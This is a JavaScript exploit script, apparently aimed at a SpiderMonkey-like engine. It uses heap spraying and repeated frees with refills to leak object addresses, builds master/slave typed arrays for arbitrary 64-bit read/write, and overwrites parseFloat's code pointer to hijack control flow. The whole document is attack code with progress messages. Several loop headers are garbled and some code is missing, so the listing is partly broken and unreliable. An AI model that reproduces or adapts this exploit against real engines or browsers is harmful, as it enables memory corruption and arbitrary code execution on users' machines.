    var a;
    var refcopy;
    var refill_0;
    var refill_1;
    var spray;
    var jsobj_leak_data;
    var x;
    var y;
    var master;
    var slave;
    var master_addr;
    var slave_addr;
    var test;
    var test_addr;
    var fake_test;
    var test_values;
    var test_values_read;
    spray = [];
    jsobj_leak_data = new Uint32Array(0x38);
    jsobj_leak_data.fill(0);
    // .slice will allocate a new JSString
    x = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.slice(1);
    y = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.slice(1);
    master = new Uint32Array(0x40);
    master.fill(0x31313131);
    slave = new Uint32Array(0x40);
    slave.fill(0x61616161);
    print("starting exploit");
    print("spraying buffers");
    for (var i = 0; i = 0; j--) {
            var char = ptr.charCodeAt(j).toString(16);
            if (char.length == 1)
                char = '0' + char;
            val += char;
        }
        val = parseInt(val, 16);
        jsobj_leak_data[i / 4] = val;
    }
    var shape = toint64(jsobj_leak_data[(24 - 0x10) / 4], jsobj_leak_data[(28 - 0x10) / 4]);
    var prop = toint64(jsobj_leak_data[(32 - 0x10) / 4], jsobj_leak_data[(36 - 0x10) / 4]);
    var values = toint64(jsobj_leak_data[(56 - 0x10) / 4], jsobj_leak_data[(60 - 0x10) / 4]);
    print("shape @ " + shape.toString(16));
    print("prop @ " + prop.toString(16));
    print("values @ " + values.toString(16));
    print("freeing target twice and refilling with two JSObjects");
    refill_1 = 0;
    refill_1 = [0x1337, 0x1337];
    refill_0 = 0;
    refill_0 = [0x71717171];
    print("freeing object again and refilling with ArrayBuffer data");
    refill_1 = 0;
    // Need to free other JSObject size things as well to cause the
    // data to overlap and not the JSObject of the ArrayBuffer
    x = 0;
    y = 0;
    refill_1 = new Uint32Array(0x48 / 4);
    refill_1.fill(0x41414141);
    print("crafting JSObject with values pointing to spray buffer data");
    jsobj_leak_data[(56 - 0x10) / 4] += 0x2000;
    overlap_addr = values + 0x2000;
    for (var i = 4; i values to slave addr");
    // Point our crafted JSObject values to the address of master->values
    refill_1[(56) / 4] = (master_addr & 0xffffffff) + 56;
    refill_0[0] = slave;
    //refill_1[(56) / 4] = overlap_addr;
    print("setting up arb read/write");
    function write64(addr, val) {
        master[56 / 4] = (addr & 0xffffffff) >>> 0;
        master[60 / 4] = addr / 0x100000000;
        slave[0] = val & 0xffffffff;
        slave[1] = val / 0x100000000;
    }
    print("jumping to 0x41414141");
    write64(parseFloat_addr + 0x30, 0x414141414141);
    parseFloat();
    print("DONE");